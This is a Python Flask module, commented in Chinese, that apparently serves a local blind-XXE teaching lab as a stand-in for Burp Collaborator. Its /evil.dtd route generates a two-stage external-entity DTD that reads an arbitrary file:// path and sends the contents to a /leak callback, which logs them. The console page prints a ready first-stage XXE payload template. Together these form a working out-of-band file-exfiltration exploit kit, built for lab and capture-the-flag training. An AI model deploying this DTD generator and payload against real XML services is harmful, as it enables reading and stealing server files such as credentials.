# -*- coding: utf-8 -*-
"""xxe2 配套 OOB（带外）监听平台 —— 原 Node oob_server.js 的 Flask 等价实现。
真实世界里这一角色由 Burp Collaborator / requestbin 扮演，这里是本地教学模拟。

nginx 在 8307 端口把请求代理到本蓝图 /oob/*，因此题目与 writeup 里的
http://127.0.0.1:8307/... 地址无需任何改动。

路由（与原 oob_server.js 一一对应）：
  GET /                    控制台首页（用法 + 实时日志，3s 自动刷新）
  GET /evil.dtd?cb=&f=&t=  动态生成第二级 DTD（读 f 并把内容回调到 cb/leak?d=…）
  GET /leak?d=<数据>&t=…   回调落库（靶机"喊"出来的数据）
  GET /api/log             日志 JSON（首页轮询；CORS: *）
  GET /clear               清空日志
"""
import json
import os
import time

from flask import Blueprint, jsonify, redirect, request

oob_bp = Blueprint("oob", __name__, url_prefix="/oob")

LOG_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "data", "oob_log.jsonl")


def _now():
    return time.strftime("%Y-%m-%d %H:%M:%S")


def _load():
    try:
        with open(LOG_PATH, encoding="utf-8") as f:
            return [json.loads(ln) for ln in f if ln.strip()]
    except (OSError, ValueError):
        return []


def _append(entry):
    os.makedirs(os.path.dirname(LOG_PATH), exist_ok=True)
    with open(LOG_PATH, "a", encoding="utf-8") as f:
        f.write(json.dumps(entry, ensure_ascii=False) + "\n")


def _esc(s):
    return (str(s).replace("&", "&amp;").replace("<", "&lt;")
            .replace(">", "&gt;").replace('"', "&quot;"))


@oob_bp.get("/")
def console():
    host = request.headers.get("Host", "127.0.0.1:8307")
    logs = _load()[-100:]
    rows = "".join(
        f"<tr><td>{_esc(l['time'])}</td><td>{_esc(l['ip'])}</td><td>{_esc(l['path'])}</td>"
        f"<td><code>{_esc(l['data'])}</code></td></tr>" for l in reversed(logs))
    html = f"""<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8">
<title>OOB 监听平台（模拟 Collaborator）</title>
<meta http-equiv="refresh" content="3">
<style>
body{{margin:0;font-family:"Segoe UI",system-ui,sans-serif;background:#0a0f1e;color:#e2e8f0;line-height:1.75;padding:28px 16px}}
.w{{max-width:980px;margin:0 auto}}h1{{font-size:22px;color:#38bdf8}}
.box{{background:#1e293b;border:1px solid #334155;border-radius:12px;padding:16px 20px;margin:14px 0}}
pre{{background:#0b1220;border:1px solid #27364d;border-radius:8px;padding:12px;overflow:auto;font-size:13px}}
code{{background:#0b1220;border-radius:4px;padding:1px 6px;font-size:13px}}
table{{border-collapse:collapse;width:100%;font-size:13px}}td,th{{border:1px solid #334155;padding:6px 10px;text-align:left}}
th{{color:#38bdf8}}.tag{{color:#fbbf24}}a{{color:#38bdf8}}
</style></head><body><div class="w">
<h1>🛰️ OOB 监听平台 <span class="tag">（本地模拟 · Burp Collaborator 的替身）</span></h1>
<div class="box"><b>本平台地址</b>：<code>http://{_esc(host)}/</code>
<br><b>用法</b>：让靶机请求 <code>/evil.dtd?cb=http://{_esc(host)}&amp;f=file:///&lt;要读的文件&gt;</code>，
平台会动态生成两级实体 DTD——靶机解析时会读取 <code>f</code> 指向的文件，并把内容作为 <code>d=</code> 参数回调到 <code>/leak</code>（下方日志实时展示，3 秒自动刷新）。
<br>一级 payload 模板（提交给靶机）：
<pre>&lt;!DOCTYPE batch [
  &lt;!ENTITY % remote SYSTEM "http://{_esc(host)}/evil.dtd?cb=http://{_esc(host)}&amp;f=file:///&lt;目标文件&gt;"&gt;
  %remote;
]&gt;
&lt;batch&gt;&lt;item&gt;x&lt;/item&gt;&lt;/batch&gt;</pre>
<a href="/clear">清空日志</a></div>
<div class="box"><b>📡 泄露日志（{len(logs)} 条）</b>
<table><tr><th>时间</th><th>来源 IP</th><th>入口</th><th>数据</th></tr>
{rows or '<tr><td colspan="4" style="color:#94a3b8">（空：等靶机把数据"喊"过来）</td></tr>'}
</table></div>
</div></body></html>"""
    return html


@oob_bp.get("/evil.dtd")
def evil_dtd():
    host = request.headers.get("Host", "127.0.0.1:8307")
    cb = request.args.get("cb") or f"http://{host}"
    f = request.args.get("f") or "file:///flag_xxe2.txt"
    t = request.args.get("t") or "main"
    cb_base = cb.rstrip("/")
    dtd = (
        f'<!ENTITY % file SYSTEM "{f}">\n'
        f'<!ENTITY % int "<!ENTITY &#37; send SYSTEM \'{cb_base}/leak?d=%file;\'>">\n'
        "%int;\n%send;\n"
    )
    _append({"time": _now(), "ip": request.remote_addr or "-", "path": "/evil.dtd",
             "data": f"[payload] 读取 {f} → 回调 {cb_base}", "tag": t})
    return dtd, 200, {"Content-Type": "application/xml-dtd; charset=utf-8"}


@oob_bp.get("/leak")
def leak():
    d = request.args.get("d", "")
    t = request.args.get("t", "")
    _append({"time": _now(), "ip": request.remote_addr or "-", "path": "/leak",
             "data": d, "tag": t})
    return "got it\n", 200, {"Content-Type": "text/plain; charset=utf-8"}


@oob_bp.get("/api/log")
def api_log():
    resp = jsonify(_load()[-100:])
    resp.headers["Access-Control-Allow-Origin"] = "*"
    return resp


@oob_bp.get("/clear")
def clear():
    try:
        os.remove(LOG_PATH)
    except OSError:
        pass
    # 经 8307 代理访问时 "/" 即控制台（nginx 已把 / 映射到 /oob/）
    return redirect("/")
